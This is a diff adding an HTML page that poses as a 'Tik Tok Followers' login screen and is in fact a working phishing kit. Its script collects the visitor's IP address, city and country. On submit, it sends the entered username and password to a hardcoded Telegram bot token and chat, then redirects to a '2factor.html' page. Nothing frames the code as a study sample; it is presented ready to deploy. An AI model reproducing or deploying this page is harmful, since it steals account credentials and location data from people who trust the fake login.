@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+
+
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
+    }
+    }
+</style>
+</head>
+<body onload="updateyear()">
+</div>
+<div id="main-tool">
+	<div class="wrapper"><img src="logo.png"></div>
+	<h1 id="TFG">Login</h1>
+
+<p class="sub-heading"></p>
+<p class="sub-heading"></p>
+
+
+    <form id="contactForm" method="POST">
+    <center>
+    <div id="fillup">
+        <input type="text" id="ipaddress" name="IPaddress" hidden>
+       <input type="hidden" id="city" name="city">
+<input type="hidden" id="country" name="country">
+        <div class="form-option">
+        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" id="username" required>
+        </div>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="password" class="input-form input-command" type="password" placeholder="Password" id="password" required>
+        </div>
+
+        <br><br>
+        <button class="buttonstyle" id="button" type="submit"><b>Login</b></button>
+        </center>
+
+    </div>
+</div>
+
+<div id="steps" style="display:none;">
+
+</div>
+
+<div id="comment" style="display:none;" >
+</div>
+<script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipaddress = data.ip;
+                    document.getElementById('ipaddress').value = ipaddress;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
+  fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('city').value = data.city || '';
+        document.getElementById('country').value = data.country_name || '';
+      })
+      .catch(error => console.error('Location error:', error));
+  document.getElementById('contactForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var ipaddress = document.getElementById('ipaddress').value;
+   
+            const city = document.getElementById('city').value;
+      const country = document.getElementById('country').value;
+            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
+           
+          var token = '6574493215:AAGDBfNivQ3vTzxAe-ltH4oIIB25mAr7pD4';
+        var chat_id = '6055794207';
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = '2factor.html';  // Redirect to thank you page
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+
+    </script>
+</body>
+
+</html>
